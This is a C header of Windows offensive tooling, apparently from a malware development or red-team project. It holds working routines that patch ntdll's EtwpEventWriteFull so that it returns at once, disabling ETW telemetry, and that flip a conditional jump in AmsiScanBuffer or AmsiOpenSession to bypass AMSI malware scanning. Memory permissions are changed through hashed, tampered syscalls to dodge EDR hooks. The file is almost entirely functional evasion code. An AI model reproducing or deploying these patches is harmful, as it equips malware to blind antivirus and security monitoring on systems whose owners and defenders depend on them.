#pragma once
#include <windows.h>
#include <stdio.h>

typedef enum PATCH
{
	PATCH_AMSI_SCAN_BUFFER,
	PATCH_AMSI_OPEN_SESSION
};

#define x64_CALL_INSTRUCTION_OPCODE			0xE8		// 'call'	- instruction opcode
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'	- instruction opcode
#define NOP_INSTRUCTION_OPCODE				0x90		// 'nop'	- instruction opcode

#define PATCH_SIZE							0x05


// Get the address of 'EtwpEventWriteFull'
PVOID FetchEtwpEventWriteFull() {

	INT		i				= 0;
	PBYTE	pEtwEventFunc	= NULL;
	DWORD	dwOffSet		= 0x00;

	// Both "EtwEventWrite" OR "EtwEventWriteFull" will work
	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
	if (!pEtwEventFunc)
		return NULL;
	printf("[+] pEtwEventFunc : 0x%0p \n", pEtwEventFunc);

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwEventFunc[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFunc[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwEventFunc[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventFunc = (PBYTE)&pEtwEventFunc[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE)
		return NULL;

	printf("\t> \"call EtwpEventWriteFull\" : 0x%p \n", pEtwEventFunc);

	// Skipping the 'E8' byte ('call' opcode)
	pEtwEventFunc++;

	// Fetching EtwpEventWriteFull's offset
	dwOffSet = *(DWORD*)pEtwEventFunc;
	printf("\t> Offset : 0x%0.8X \n", dwOffSet);

	// Adding the size of the offset to reach the end of the call instruction
	pEtwEventFunc += sizeof(DWORD);

	// Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	pEtwEventFunc += dwOffSet;

	// pEtwEventFunc is now the address of EtwpEventWriteFull
	return (PVOID)pEtwEventFunc;
}


BOOL PatchEtwpEventWriteFullStart() {

	PVOID		pEtwpEventWriteFull = NULL;
	DWORD		dwOldProtection		= 0x00;
	BYTE		pShellcode[3]		= {
		0x33, 0xC0,			// xor eax, eax
		0xC3				// ret
	};
    SIZE_T      sShellcode          = sizeof(pShellcode);

	// Getting EtwpEventWriteFull address
	pEtwpEventWriteFull = FetchEtwpEventWriteFull();
	if (!pEtwpEventWriteFull)
		return FALSE;
	printf("[+] pEtwpEventWriteFull : 0x%p \n", pEtwpEventWriteFull);


	printf("\t> Patching with \"30 C0 C3\" ... ");

	// Change memory permissions to RWX
	TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, (HANDLE)-1, &pEtwpEventWriteFull, &sShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);
    //if (!VirtualProtect(pEtwpEventWriteFull, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	//	printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
	//	return FALSE;
	//}

	// Apply the patch
	memcpy(pEtwpEventWriteFull, pShellcode, sizeof(pShellcode));

	// Change memory permissions to original
	TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, (HANDLE)-1, &pEtwpEventWriteFull, &sShellcode, dwOldProtection, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);
    //if (!VirtualProtect(pEtwpEventWriteFull, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
	//	printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
	//	return FALSE;
	//}
	
	printf("[+] DONE !\n\n");

	return TRUE;
}

BOOL PatchAmsiScanBufferJe(enum PATCH ePatch) {

	HMODULE		hAmsi				= NULL;
	PBYTE		pTargetAmsiFunc		= NULL,
				pTmpAddress			= NULL,
				pTmpAddress2		= NULL,
				pPatchAddress		= NULL;
	BYTE		bOffset				= 0x00;
	DWORD		dwOldProtection		= 0x00;
	INT			x					= 0x00;
    SIZE_T      replace             = 0x01;

	if (!(hAmsi = LoadLibrary(TEXT("AMSI")))) {
		printf("[!] LoadLibrary Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(pTargetAmsiFunc = GetProcAddress(hAmsi, ePatch == PATCH_AMSI_SCAN_BUFFER ? "AmsiScanBuffer" : "AmsiOpenSession"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	for (int i = 0; i < 0x1000; i++) {
		// 0xCCC3: ret | int3
		if (*(unsigned short*)(pTargetAmsiFunc + i) == 0xCCC3) {
			x = i;
			break;
		}
	}

	if (!x)
		return FALSE;

	for (int i = x; i > 0; i--) {

		pTmpAddress = (pTargetAmsiFunc + i);

		// 0x74: je
		if (*(PBYTE)pTmpAddress == 0x74) {

			// Adding 1 to skip the 'je' instruction
			bOffset = *(PBYTE)(pTmpAddress + sizeof(BYTE));

			// Add the offset to the address following the 'je offset' instruction - Adding 2 to skip the 'je offset' statement
			pTmpAddress2 = (PBYTE)(pTmpAddress + (sizeof(BYTE) * 2) + bOffset);

			// Exit if the first instruction is found to be a 'mov' instruction
			// 0xB8: mov
			if (*(PBYTE)pTmpAddress2 == 0xB8) {
				pPatchAddress = pTmpAddress;
				break;
			}
		}
	}

	if (!pPatchAddress)
		return FALSE;

	TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, (HANDLE)-1, &pPatchAddress, &replace, PAGE_EXECUTE_READWRITE, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);
    //if (!VirtualProtect(pPatchAddress, 0x01, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	//	printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
	//	return FALSE;
	//}

	// 0x75: jne
	*(BYTE*)pPatchAddress = 0x75;

	TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, (HANDLE)-1, &pPatchAddress, &replace, dwOldProtection, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);	
    //if (!VirtualProtect(pPatchAddress, 0x01, dwOldProtection, &dwOldProtection)) {
	//	printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
	//	return FALSE;
	//}

	return TRUE;
}